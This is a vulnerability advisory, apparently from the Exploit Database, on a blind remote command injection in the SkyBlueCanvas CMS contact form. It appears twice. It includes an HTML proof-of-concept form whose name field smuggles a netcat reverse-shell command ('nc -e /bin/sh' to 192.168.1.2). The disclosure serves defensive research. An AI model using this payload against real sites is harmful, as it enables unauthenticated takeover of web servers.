# Remote Command Injection Vulnerability in SkyBlueCanvas CMS

---

*From*: Scott Parish <Scott.Parish () cisecurity org>

```
Vulnerability in SkyBlueCanvas CMS

Vulnerability Type:
Remote Command Injection

Version Affected:
1.1 r248-03 (and probably prior versions)

Discovered by:
Scott Parish - Center for Internet Security

Vendor Information:
SkyBlueCanvas is an easy-to-use Web Content Management System, that makes it simple to keep the content of your site
fresh. You simply upload the software to your web server, and you are ready to start adding text and pictures to your
web site.

Vulnerability Details:
The SkyBlueCanvas Lightweight CMS application contains a remote command injection vulnerability within the form on the
Contact page. A remote un-authenticated user can exploit this vulnerability to force the webserver to execute commands
in the context of the vulnerable application. It is possible to exploit this vulnerability because the POST parameters
"name", "email", "subject", and  "message" are not properly sanitized when submitted to the index.php?pid=4 page.
Arbitrary commands can be executed by injecting the following payload to a vulnerable parameter:
A"; <command>
Since the page does not display the results of the injected command (blind injection) then testing must be done using a
ping, nc, or similar command.

Proof of Concept Exploit Code:
<html>
<body>
<form action="<http://localhost/index.php?pid=4">; method="post">
  <input type="hidden" name="cid" value="3">
  <input type="hidden" name="name" value="test&#34;&#59; nc -e /bin/sh 192.168.1.2 12345">
  <input type="hidden" name="email" value="test">
  <input type="hidden" name="subject" value="test">
  <input type="hidden" name="message" value="test">
  <input type="hidden" name="action" value="Send">
  <input type="submit" value="submit">
</form>
</body>
</html>

References:

Remediation:
The vendor has issued a fix to the vulnerability in version 1.1 r248-04

Revision History:
1/9/14 - Vulnerability discovered
1/10/14 - Vulnerability disclosed privately to vendor
1/22/14 - Patch released by vendor

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

**Vulnerable App:**

```
Vulnerability in SkyBlueCanvas CMS

Vulnerability Type:
Remote Command Injection

Version Affected:
1.1 r248-03 (and probably prior versions)

Discovered by:
Scott Parish - Center for Internet Security

Vendor Information:
SkyBlueCanvas is an easy-to-use Web Content Management System, that makes it simple to keep the content of your site
fresh. You simply upload the software to your web server, and you are ready to start adding text and pictures to your
web site.

Vulnerability Details:
The SkyBlueCanvas Lightweight CMS application contains a remote command injection vulnerability within the form on the
Contact page. A remote un-authenticated user can exploit this vulnerability to force the webserver to execute commands
in the context of the vulnerable application. It is possible to exploit this vulnerability because the POST parameters
"name", "email", "subject", and  "message" are not properly sanitized when submitted to the index.php?pid=4 page.
Arbitrary commands can be executed by injecting the following payload to a vulnerable parameter:
A"; <command>
Since the page does not display the results of the injected command (blind injection) then testing must be done using a
ping, nc, or similar command.

Proof of Concept Exploit Code:
<html>
<body>
<form action="http://localhost/index.php?pid=4"; method="post">
  <input type="hidden" name="cid" value="3">
  <input type="hidden" name="name" value="test&#34;&#59; nc -e /bin/sh 192.168.1.2 12345">
  <input type="hidden" name="email" value="test">
  <input type="hidden" name="subject" value="test">
  <input type="hidden" name="message" value="test">
  <input type="hidden" name="action" value="Send">
  <input type="submit" value="submit">
</form>
</body>
</html>

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
